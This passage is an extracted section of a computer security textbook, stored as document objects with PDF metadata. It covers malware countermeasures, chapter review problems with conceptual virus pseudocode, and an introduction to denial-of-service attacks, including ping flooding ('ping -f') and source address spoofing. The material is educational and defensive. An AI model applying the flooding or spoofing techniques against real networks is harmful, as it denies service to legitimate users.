       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 241, 'page_label': '240'}, page_content='240  CHAPTER 6 / MAliCiouS SofTwARE\\nvirtualized environment, and suppresses malicious behavior if so. Other malware \\nincludes extended sleep periods before engaging in malicious activity, in an attempt \\nto evade detection before the analysis terminates. Or the malware may include a logic \\nbomb looking for a specific date, or specific system type or network location before \\nengaging in malicious activity, which the sandbox environment does not match. In \\nresponse, analysts adapt their sandbox environments to attempt to evade these tests. \\nThis race continues.\\nHost-based dynaMic Malware analysis Unlike heuristics or fingerprint-based \\nscanners, dynamic malware analysis or behavior-blocking software integrates with the \\noperating system of a host computer and monitors program behavior in real time for \\nmalicious actions [CONR02, EGEL12]. It is a type of host-based intrusion preven -\\ntion system, which we will discuss further in Section 9.6. This software monitors the \\nbehavior of possibly malicious code, looking for potentially malicious actions, similar \\nto the sandbox systems we discussed in the previous section. However, it then has \\nthe capability to block malicious actions before they can affect the target system. \\nMonitored behaviors can include the following:\\n• Attempts to open, view, delete, and/or modify files\\n• Attempts to format disk drives and other unrecoverable disk operations\\n• Modifications to the logic of executable files or macros\\n• Modification of critical system settings, such as start-up settings\\n• Scripting of e-mail and instant messaging clients to send executable content\\n• Initiation of network communications\\nBecause dynamic analysis software can block suspicious software in real time, it has \\nan advantage over such established anti-virus detection techniques as fingerprinting \\nor heuristics. There are literally trillions of different ways to obfuscate and rearrange \\nthe instructions of a virus or worm, many of which will evade detection by a finger -\\nprint scanner or heuristic. But eventually, malicious code must make a well-defined \\nrequest to the operating system. Given that the behavior blocker can intercept all \\nsuch requests, it can identify and block malicious actions regardless of how obfuscated \\nthe program logic appears to be.\\nDynamic analysis alone has limitations. Because the malicious code must run on \\nthe target machine before all its behaviors can be identified, it can cause harm before \\nit has been detected and blocked. For example, a new item of malware might shuffle \\na number of seemingly unimportant files around the hard drive before modifying a \\nsingle file and being blocked. Even though the actual modification was blocked, the \\nuser may be unable to locate his or her files, causing a loss to productivity or possibly \\nworse.\\nspyware detection and reMoVal Although general anti-virus products include \\nsignatures to detect spyware, the threat this type of malware poses, and its use of \\nstealthing techniques, means that a range of spyware specific detection and removal \\nutilities exist. These specialize in the detection and removal of spyware, and provide \\nmore robust capabilities. Thus they complement, and should be used along with, more \\ngeneral anti-virus products.\\nM06_STAL0611_04_GE_C06.indd   240 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 242, 'page_label': '241'}, page_content='6.10 / CouNTERMEASuRES  241\\nrootkit counterMeasures Rootkits can be extraordinarily difficult to detect and \\nneutralize, particularly so for kernel-level rootkits. Many of the administrative tools \\nthat could be used to detect a rootkit or its traces can be compromised by the rootkit \\nprecisely so it is undetectable.\\nCountering rootkits requires a variety of network- and computer-level security \\ntools. Both network-based and host-based IDSs can look for the code signatures of \\nknown rootkit attacks in incoming traffic. Host-based anti-virus software can also be \\nused to recognize the known signatures.\\nOf course, there are always new rootkits and modified versions of existing \\nrootkits that display novel signatures. For these cases, a system needs to look for \\nbehaviors that could indicate the presence of a rootkit, such as the interception of \\nsystem calls or a keylogger interacting with a keyboard driver. Such behavior detec-\\ntion is far from straightforward. For example, anti-virus software typically intercepts \\nsystem calls.\\nAnother approach is to do some sort of file integrity check. An example of \\nthis is RootkitRevealer, a freeware package from SysInternals. The package com -\\npares the results of a system scan using APIs with the actual view of storage using \\ninstructions that do not go through an API. Because a rootkit conceals itself by \\nmodifying the view of storage seen by administrator calls, RootkitRevealer catches \\nthe discrepancy.\\nIf a kernel-level rootkit is detected, the only secure and reliable way to recover \\nis to do an entire new OS install on the infected machine.\\nPerimeter Scanning Approaches\\nThe next location where anti-virus software is used is on an organization’s firewall \\nand IDS. It is typically included in e-mail and Web proxy services running on these \\nsystems. It may also be included in the traffic analysis component of an IDS. This gives \\nthe anti-virus software access to malware in transit over a network connection to any \\nof the organization’s systems, providing a larger scale view of malware activity. This \\nsoftware may also include intrusion prevention measures, blocking the flow of any \\nsuspicious traffic, thus preventing it reaching and compromising some target system, \\neither inside or outside the organization.\\nHowever, this approach is limited to scanning the malware content, as it does \\nnot have access to any behavior observed when it runs on an infected system. Two \\ntypes of monitoring software may be used:\\n• Ingress monitors: These are located at the border between the enterprise net-\\nwork and the Internet. They can be part of the ingress filtering software of a \\nborder router or external firewall or a separate passive monitor. These monitors \\ncan use either anomaly or signature and heuristic approaches to detect malware \\ntraffic, as we will discuss further in Chapter 8. A honeypot can also capture \\nincoming malware traffic. An example of a detection technique for an ingress \\nmonitor is to look for incoming traffic to unused local IP addresses.\\n• Egress monitors: These can be located at the egress point of individual LANs on \\nthe enterprise network as well as at the border between the enterprise network \\nand the Internet. In the former case, the egress monitor can be part of the egress \\nM06_STAL0611_04_GE_C06.indd   241 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 243, 'page_label': '242'}, page_content='242  CHAPTER 6 / MAliCiouS SofTwARE\\nfiltering software of a LAN router or switch. As with ingress monitors, the exter-\\nnal firewall or a honeypot can house the monitoring software. Indeed, the two \\ntypes of monitors can be installed in one device. The egress monitor is designed \\nto catch the source of a malware attack by monitoring outgoing traffic for signs \\nof scanning or other suspicious behavior. This monitoring could look for the \\ncommon sequential or random scanning behavior used by worms and rate limit \\nor block it. It may also be able to detect and respond to abnormally high e-mail \\ntraffic such as that used by mass e-mail worms, or spam payloads. It may also \\nimplement data exfiltration “data-loss” technical counter measures, monitoring \\nfor unauthorized transmission of sensitive information out of the organization.\\nPerimeter monitoring can also assist in detecting and responding to botnet activity \\nby detecting abnormal traffic patterns associated with this activity. Once bots are \\nactivated and an attack is underway, such monitoring can be used to detect the attack. \\nHowever, the primary objective is to try to detect and disable the botnet during its \\nconstruction phase, using the various scanning techniques we have just discussed, \\nidentifying and blocking the malware that is used to propagate this type of payload.\\nDistributed Intelligence Gathering Approaches\\nThe final location where anti-virus software is used is in a distributed configuration. \\nIt gathers data from a large number of both host-based and perimeter sensors, relays \\nthis intelligence to a central analysis system able to correlate and analyze the data, \\nwhich can then return updated signatures and behavior patterns to enable all of the \\ncoordinated systems to respond and defend against malware attacks. A number of \\nsuch systems have been proposed. This is a specific example of a distributed intru -\\nsion prevention system (IPS), targeting malware, which we will discuss further in \\nSection 9.6.\\n 6.11 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\nKey Terms\\nadvanced persistent threat\\nadware\\nattack kit\\nbackdoor\\nblended attack\\nboot-sector infector\\nbot\\nbotnet\\ncrimeware\\ndata exfiltration\\ndownloader\\ndrive-by-download\\ne-mail virus\\ninfection vector\\nkeyloggers\\nlogic bomb\\nmacro virus\\nmalicious software\\nmalware\\nmetamorphic virus\\nmobile code\\nparasitic virus\\npayload\\nphishing\\npolymorphic virus\\npropagate\\nransomware\\nrootkit\\nscanning\\nspear-phishing\\nspyware\\nstealth virus\\ntrapdoor\\nTrojan horse\\nvirus\\nwatering-hole attack\\nworm\\nzombie\\nzero-day exploit\\nM06_STAL0611_04_GE_C06.indd   242 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 244, 'page_label': '243'}, page_content='6.11 / KEY TERMS, REViEw QuESTioNS, AND PRoBlEMS  243\\nReview Questions\\n 6.1 What are three broad mechanisms that malware can use to propagate?\\n 6.2 What are four broad categories of payloads that malware may carry?\\n 6.3 What characteristics of an advanced persistent threat give it that name?\\n 6.4 What are typical phases of operation of a virus or worm?\\n 6.5 What is a blended attack?\\n 6.6 What is the difference between a worm and a zombie?\\n 6.7 What does “fingerprinting” mean for network worms?\\n 6.8 What is a “drive-by-download” and how does it differ from a worm?\\n 6.9 How does a T rojan enable malware to propagate? How common are Trojans on \\n computer systems? Or on mobile platforms?\\n 6.10 What is a “logic bomb”?\\n 6.11 What is the difference between a backdoor, a bot, a keylogger, spyware, and a rootkit? \\nCan they all be present in the same malware?\\n 6.12 What is the dif ference between a “phishing” attack and a “spear-phishing” attack, \\n particularly in terms of who the target may be?\\n 6.13 What is a clickjacking vulnerability?\\n 6.14 List a few characteristics to classify rootkits.\\n 6.15 Briefly describe the elements of a GD scanner.\\n 6.16 Describe some rootkit countermeasures.\\nProblems\\n 6.1 A computer virus places a copy of itself into other progr ams, and arranges for that \\ncode to be run when the program executes. The “simple” approach just appends \\nthe code after the existing code, and changes the address where code execution \\nstarts. This will clearly increase the size of the program, which is easily observed. \\nInvestigate and briefly list some other approaches that do not change the size of the \\nprogram.\\n 6.2 The question arises as to whether it is possible to develop a program that can analyze \\na piece of software to determine if it is a virus. Consider that we have a program D \\nthat is supposed to be able to do that. That is, for any program P , if we run D(P), the \\nresult returned is TRUE (P is a virus) or FALSE (P is not a virus). Now consider the \\nfollowing program:\\nProgram CV :=\\n   {. . .\\n   main-program :=\\n        {if D(CV) then goto next:\\n              else infect-executable;\\n        }\\nnext:\\n }\\n  In the preceding program, infect-executable is a module that scans memory for exe -\\ncutable programs and replicates itself in those programs. Determine if D can correctly \\ndecide whether CV is a virus.\\n 6.3 The following code fragments show a sequence of virus instructions and a metamor -\\nphic version of the virus. Describe the effect produced by the metamorphic code.\\nM06_STAL0611_04_GE_C06.indd   243 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 245, 'page_label': '244'}, page_content='244  CHAPTER 6 / MAliCiouS SofTwARE\\nOriginal Code Metamorphic Code\\nmov eax, 5 mov eax, 5\\nadd eax, ebx push ecx\\ncall [eax] pop ecx\\nadd eax, ebx\\nswap eax, ebx\\nswap ebx, eax\\ncall [eax]\\nnop\\n 6.4 The list of passwords used by the Morris worm is provided at this book’s website.\\na. The assumption has been expressed by many people that this list represents words \\ncommonly used as passwords. Does this seem likely? Justify your answer.\\nb. If the list does not reflect commonly used passwords, suggest some approaches \\nthat Morris may have used to construct the list.\\n 6.5 Consider the following fragment:\\nlegitimate code\\nif an infected document is opened;\\n    trigger_code_to_infect_other_documents();\\nlegitimate code\\nWhat type of malware is this?\\n 6.6 Consider the following fragment embedded in a webpage:\\nusername = read_username();\\npassword = read_password();\\nif username and password are valid\\n    return ALLOW_LOGIN;\\n    executable_start_download();\\nelse return DENY_LOGIN\\n    executable_start_download();\\nWhat type of malicious software is this?\\n 6.7 Many websites use a CAPTCHA image on their login page . A typical application of \\nthis is in an HTML form asking for the email ID and the login password of a  user. \\nThe webpage also shows some numbers and letters, modified in a manner such that it \\nis still easy for a human to recognize these characters. The user is then asked to recog-\\nnize these characters and is granted login access only when they successfully enter the \\ncharacters. Explain how using a CAPTCHA can help prevent email spam. What is the \\nmain difficulty with using CAPTCHAs?\\n 6.8 What are honeypots? How are they better at resisting spam bots than CAPTCHAs?\\n 6.9 Suppose that while working on a course assignment you come across a softwar e that \\nseems efficient to complete the assignment. When you run the software, however, you \\nobserve it keeps redirecting you to a different website and does not do the desired \\ntask. Is there a threat to your computer system?\\nM06_STAL0611_04_GE_C06.indd   244 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 246, 'page_label': '245'}, page_content='6.11 / KEY TERMS, REViEw QuESTioNS, AND PRoBlEMS  245\\n 6.10 Suppose you have a new smartphone and ar e excited about the range of apps avail -\\nable for it. You read about a really interesting new game that is available for your \\nphone. You do a quick Web search for it and see that a version is available from one of \\nthe free marketplaces. When you download and start to install this app, you are asked \\nto approve the access permissions granted to it. You see that it wants permission to \\n“Send SMS messages” and to “Access your address-book” . Should you be suspicious \\nthat a game wants these types of permissions? What threat might the app pose to your \\nsmartphone, should you grant these permissions and proceed to install it? What types \\nof malware might it be?\\n 6.11 Assume you receive an e-mail, which appears to come from a senior manager in your \\ncompany, with a subject indicating that it concerns a project that you are currently \\nworking on. When you view the e-mail, you see that it asks you to review the attached \\nrevised press release, supplied as a PDF document, to check that all details are correct \\nbefore management releases it. When you attempt to open the PDF, the viewer pops \\nup a dialog labeled “Launch File” indicating that “the file and its viewer application \\nare set to be launched by this PDF file.” In the section of this dialog labeled “File,” \\nthere are a number of blank lines, and finally the text “Click the ‘Open’ button to view \\nthis document.” You also note that there is a vertical scroll-bar visible for this region. \\nWhat type of threat might this pose to your computer system should you indeed select \\nthe “Open” button? How could you check your suspicions without threatening your \\nsystem? What type of attack is this type of message associated with? How many peo-\\nple are likely to have received this particular e-mail?\\n 6.12 Assume you receive an e-mail,  which appears to come from an online air ticket res -\\nervation system, includes original logo and has following contents: “Dear Customer, \\nThank you for booking your air ticket through our online reservation system. The \\nPNR for your journey from City1 to City2 is JADSA and for your return journey is \\nEWTEQ. You can download your tickets by logging in through this link.” Assume you \\nare a frequent visitor of City1 and City2 is another city you visit very frequently. What \\nform of attack is this e-mail attempting? What is the most likely mechanism used to \\ndistribute this e-mail? How should you respond to such e-mails?\\n 6.13 Suppose you receive a letter, which appears to come from your company’s mail server \\nstating that the password for your account has been changed, and that an action is \\nrequired to confirm this. However, as far as you know, you have not changed the pass-\\nword! What may have occurred that led to the password being changed? What type of \\nmalware, and on which computer systems, might have provided the necessary infor -\\nmation to an attacker that enabled them to successfully change the password?\\n 6.14 One of the possible locations to deploy anti-virus software is an or ganization’s fire-\\nwall so that it can obtain a larger view of the malware activity. Describe at least one \\nlimitation of adopting this approach of deploying the anti-virus software. What are the \\npossible ways, if any, to overcome this limitation?\\nM06_STAL0611_04_GE_C06.indd   245 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 247, 'page_label': '246'}, page_content='7.1 Denial-of-Service Attacks\\nThe Nature of Denial-of-Service Attacks\\nClassic Denial-of-Service Attacks\\nSource Address Spoofing\\nSYN Spoofing\\n7.2 Flooding Attacks\\nICMP Flood\\nUDP Flood\\nTCP SYN Flood\\n7.3 Distributed Denial-of-Service Attacks\\n7.4 Application-Based Bandwidth Attacks\\nSIP Flood\\nHTTP-Based Attacks\\n7.5 Reflector and Amplifier Attacks\\nReflection Attacks\\nAmplification Attacks\\nDNS Amplification Attacks\\n7.6 Defenses Against Denial-of-Service Attacks\\n7.7 Responding to a Denial-of-Service Attack\\n7.8 Key Terms, Review Questions, and Problems\\nDenial-of-Service Attacks\\nCHAPTER \\n \\n246\\nM07_STAL0611_04_GE_C07.indd   246 10/11/17   2:54 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 248, 'page_label': '247'}, page_content='7.1 / DENIAL-OF-SERVICE ATTACKS  247\\nChapter 1 listed a number of fundamental security services, including availability. \\nThis service relates to a system being accessible and usable on demand by authorized \\nusers. A denial-of-service (DoS) attack is an attempt to compromise availability by \\nhindering or blocking completely the provision of some service. The attack attempts \\nto exhaust some critical resource associated with the service. An example is flood -\\ning a Web server with so many spurious requests that it is unable to respond to \\nvalid requests from users in a timely manner. This chapter explores denial-of-service \\nattacks, their definition, the various forms they take, and defenses against them.\\n 7.1 DENIAL-OF-SERVICE ATTACKS\\nThe temporary takedown in December 2010 of a handful of websites that cut ties \\nwith controversial website WikiLeaks, including Visa and MasterCard, made world-\\nwide news. Similar attacks, motivated by a variety of reasons, occur thousands of \\ntimes each day, thanks in part to the ease by which website disruptions can be \\naccomplished.\\nHackers have been carrying out distributed denial-of-service (DDoS) attacks \\nfor many years, and their potency steadily has increased over time. Due to Internet \\nbandwidth growth, the largest such attacks have increased from a modest 400\\xa0Mbps \\nin 2002, to 100 Gbps in 2010 [ARBO10], to 300\\xa0Gbps in the Spamhaus attack in 2013, \\nand to 600 Gbps in the BBC attack in 2015. Massive flooding attacks in the 50\\xa0Gbps \\nrange are powerful enough to exceed the bandwidth capacity of almost any intended \\ntarget, including perhaps the core Internet Exchanges or critical DNS name servers, \\nbut even smaller attacks can be surprisingly effective. [SYMA16] notes that DDoS \\nattacks are growing in number and intensity, but that most last for 30 minutes or less, \\ndriven by the use of botnets-for-hire. The reasons for attacks include financial extor-\\ntion, hacktivism, and state-sponsored attacks on opponents. There are also reports of \\ncriminals using DDoS attacks on bank systems as a diversion from the real attack on \\ntheir payment switches or ATM networks. These attacks remain popular as they are \\nsimple to setup, difficult to stop, and very effective [SYMA16].\\nLearning Objectives\\nAfter studying this chapter, you should be able to:\\n ◆ Explain the basic concept of a denial-of-service attack.\\n ◆ Understand the nature of flooding attacks.\\n ◆ Describe distributed denial-of-service attacks.\\n ◆ Explain the concept of an application-based bandwidth attack and give some \\nexamples.\\n ◆ Present an overview of reflector and amplifier attacks.\\n ◆ Summarize some of the common defenses against denial-of-service attacks.\\n ◆ Summarize common responses to denial-of-service attacks.\\nM07_STAL0611_04_GE_C07.indd   247 10/11/17   2:54 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 249, 'page_label': '248'}, page_content='248  CHAPTER 7 / DENIAL-OF-SERVICE ATTACKS\\nA DDoS attack in October 2016 represents an ominous new trend in the threat. \\nThis attack, on Dyn, a major Domain Name System (DNS) service provider, lasted \\nfor many hours and involved multiple waves of attacks from over 100,000 malicious \\nendpoints. The noteworthy feature of this attack is that the attack source recruited \\nIoT (Internet of Things) devices, such as webcams and baby monitors. One estimate \\nof the volume of attack traffic is that it reached a peak as high as 1.2 TBps [LOSH16].\\nThe Nature of Denial-of-Service Attacks\\nDenial of service is a form of attack on the availability of some service. In the context \\nof computer and communications security, the focus is generally on network services \\nthat are attacked over their network connection. We distinguish this form of attack \\non availability from other attacks, such as the classic acts of god, that cause damage \\nor destruction of IT infrastructure and consequent loss of service.\\nNIST SP 800-61 ( Computer Security Incident Handling Guide , August 2012) \\ndefines denial-of-service (DoS) attack as follows:\\nA denial of service (DoS)  is an action that prevents or impairs the authorized \\nuse of networks, systems, or applications by exhausting resources such as central \\nprocessing units (CPU), memory, bandwidth, and disk space.\\nFrom this definition, you can see there are several categories of resources that \\ncould be attacked:\\n• Network bandwidth\\n• System resources\\n• Application resources\\nNetwork bandwidth relates to the capacity of the network links connecting a server \\nto the wider Internet. For most organizations, this is their connection to their Inter-\\nnet service provider (ISP), as shown in the example network in Figure 7.1. Usually \\nthis connection will have a lower capacity than the links within and between ISP \\nrouters. This means that it is possible for more traffic to arrive at the ISP’s routers \\nover these higher-capacity links than to be carried over the link to the organization. \\nIn this circumstance, the router must discard some packets, delivering only as many \\nas can be handled by the link. In normal network operation, such high loads might \\noccur to a popular server experiencing traffic from a large number of legitimate users. \\nA\\xa0random portion of these users will experience a degraded or nonexistent service \\nas a consequence. This is expected behavior for an overloaded TCP/IP network link. \\nIn a DoS attack, the vast majority of traffic directed at the target server is mali -\\ncious, generated either directly or indirectly by the attacker. This traffic overwhelms \\nany legitimate traffic, effectively denying legitimate users access to the server. Some \\nrecent high volume attacks have even been directed at the ISP network support -\\ning the target organization, aiming to disrupt its connections to other networks. A \\nnumber of DDoS attacks are listed in [AROR11], with comments on their growth \\nin volume and impact.\\nM07_STAL0611_04_GE_C07.indd   248 10/11/17   2:54 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 250, 'page_label': '249'}, page_content='7.1 / DENIAL-OF-SERVICE ATTACKS  249\\nA DoS attack targeting system resources typically aims to overload or crash its \\nnetwork handling software. Rather than consuming bandwidth with large volumes of \\ntraffic, specific types of packets are sent that consume the limited resources available \\non the system. These include temporary buffers used to hold arriving packets, tables \\nof open connections, and similar memory data structures. The SYN spoofing attack, \\nwhich we will discuss shortly, is of this type. It targets the table of TCP connections \\non the server.\\nAnother form of system resource attack uses packets whose structure triggers \\na bug in the system’s network handling software, causing it to crash. This means the \\nsystem can no longer communicate over the network until this software is reloaded, \\ngenerally by rebooting the target system. This is known as a poison packet. The clas-\\nsic ping of death  and teardrop attacks, directed at older Windows 9x systems, were \\nof this form. These targeted bugs in the Windows network code that handled ICMP \\n(Internet Control Message Protocol) echo request packets and packet fragmentation, \\nrespectively.\\nAn attack on a specific application, such as a Web server, typically involves a \\nnumber of valid requests, each of which consumes significant resources. This then \\nlimits the ability of the server to respond to requests from other users. For example, \\na Web server might include the ability to make database queries. If a large, costly \\nFigure 7.1 Example Network to Illustrate DoS Attacks\\nMedium size company\\nLAN\\nWeb server\\nLAN PCs\\nand workstations\\nBroadband\\nsubscribers\\nBroadband\\nusers\\nInternet service\\nprovider (ISP) A\\nInternet\\nRouter\\nLarge company LAN\\nBroadband\\nusers\\nInternet service\\nprovider (ISP) B Broadband\\nsubscribers\\nWeb server\\nM07_STAL0611_04_GE_C07.indd   249 10/11/17   2:54 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 251, 'page_label': '250'}, page_content='250  CHAPTER 7 / DENIAL-OF-SERVICE ATTACKS\\nquery can be constructed, then an attacker could generate a large number of these \\nthat severely load the server. This limits its ability to respond to valid requests from \\nother users. This type of attack is known as a cyberslam. [KAND05] discusses attacks \\nof this kind, and suggests some possible countermeasures. Another alternative is to \\nconstruct a request that triggers a bug in the server program, causing it to crash. This \\nmeans the server is no longer able to respond to requests until it is restarted.\\nDoS attacks may also be characterized by how many systems are used to direct \\ntraffic at the target system. Originally only one, or a small number of source systems \\ndirectly under the attacker’s control, was used. This is all that is required to send the \\npackets needed for any attack targeting a bug in a server’s network handling code \\nor some application. Attacks requiring high traffic volumes are more commonly sent \\nfrom multiple systems at the same time, using distributed or amplified forms of DoS \\nattacks. We will discuss these later in this chapter.\\nClassic Denial-of-Service Attacks\\nThe simplest classical DoS attack is a flooding attack on an organization. The aim of \\nthis attack is to overwhelm the capacity of the network connection to the target \\norganization. If the attacker has access to a system with a higher-capacity network \\nconnection, then this system can likely generate a higher volume of traffic than the \\nlower-capacity target connection can handle. For example, in the network shown in \\nFigure 7.1, the attacker might use the large company’s Web server to target the \\nmedium-sized company with a lower-capacity network connection. The attack might \\nbe as simple as using a flooding ping 1 command directed at the Web server in the \\ntarget company. This traffic can be handled by the higher-capacity links on the path \\nbetween them, until the final router in the Internet cloud is reached. At this point, \\nsome packets must be discarded, with the remainder consuming most of the capacity \\non the link to the medium-sized company. Other valid traffic will have little chance \\nof surviving discard as the router responds to the resulting congestion on this link.\\nIn this classic ping flood attack, the source of the attack is clearly identified \\nsince its address is used as the source address in the ICMP echo request packets. This \\nhas two disadvantages from the attacker’s perspective. First, the source of the attack \\nis explicitly identified, increasing the chance that the attacker can be identified and \\nlegal action taken in response. Second, the targeted system will attempt to respond \\nto the packets being sent. In the case of any ICMP echo request packets received by \\nthe server, it would respond to each with an ICMP echo response packet directed \\nback to the sender. This effectively reflects the attack back at the source system. Since \\nthe source system has a higher network bandwidth, it is more likely to survive this \\nreflected attack. However, its network performance will be noticeably affected, again \\nincreasing the chances of the attack being detected and action taken in response. For \\nboth of these reasons, the attacker would like to hide the identity of the source system. \\nThis means that any such attack packets need to use a falsified, or spoofed, address.\\n1The diagnostic “ping” command is a common network utility used to test connectivity to the specified \\ndestination. It sends TCP/IP ICMP echo request packets to the destination, and measures the time taken \\nfor the echo response packet to return, if at all. Usually these packets are sent at a controlled rate; however, \\nthe flood option specifies that they should be sent as fast as possible. This is usually specified as “ping –f” .\\nM07_STAL0611_04_GE_C07.indd   250 10/11/17   2:54 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 252, 'page_label': '251'}, page_content='7.1 / DENIAL-OF-SERVICE ATTACKS  251\\nSource Address Spoofing\\nA common characteristic of packets used in many types of DoS attacks is the use of \\nforged source addresses. This is known as source address spoofing. Given sufficiently \\nprivileged access to the network handling code on a computer system, it is easy to \\ncreate packets with a forged source address (and indeed any other attribute that is \\ndesired). This type of access is usually via the raw socket interface on many operating \\nsystems. This interface was provided for custom network testing and research into \\nnetwork protocols. It is not needed for normal network operation. However, for \\nreasons of historical compatibility and inertia, this interface has been maintained \\nin many current operating systems. Having this standard interface available greatly \\neases the task of any attacker trying to generate packets with forged attributes. \\n Otherwise, an attacker would most likely need to install a custom device driver on \\nthe source system to obtain this level of access to the network, which is much more \\nerror prone and dependent on operating system version.\\nGiven raw access to the network interface, the attacker now generates large \\nvolumes of packets. These would all have the target system as the destination address \\nbut would use randomly selected, usually different, source addresses for each packet. \\nConsider the flooding ping example from the previous section. These custom ICMP \\necho request packets would flow over the same path from the source toward the \\ntarget system. The same congestion would result in the router connected to the final \\nlower-capacity link. However, the ICMP echo response packets, generated in response \\nto those packets reaching the target system, would no longer be reflected back to the \\nsource system. Rather they would be scattered across the Internet to all the various \\nforged source addresses. Some of these addresses might correspond to real systems. \\nThese might respond with some form of error packet, since they were not expecting \\nto see the response packet received. This only adds to the flood of traffic directed at \\nthe target system. Some of the addresses may not be used or may not be reachable. \\nFor these, ICMP destination unreachable packets might be sent back. Or these pack-\\nets might simply be discarded.2 Any response packets returned only add to the flood \\nof traffic directed at the target system.\\nIn addition, the use of packets with forged source addresses means the attack-\\ning system is much harder to identify. The attack packets seem to have originated at \\naddresses scattered across the Internet. Hence, just inspecting each packet’s header \\nis not sufficient to identify its source. Rather the flow of packets of some specific \\nform through the routers along the path from the source to the target system must \\nbe identified. This requires the cooperation of the network engineers managing all \\nthese routers and is a much harder task than simply reading off the source address. It \\nis not a task that can be automatically requested by the packet recipients. Rather it \\nusually requires the network 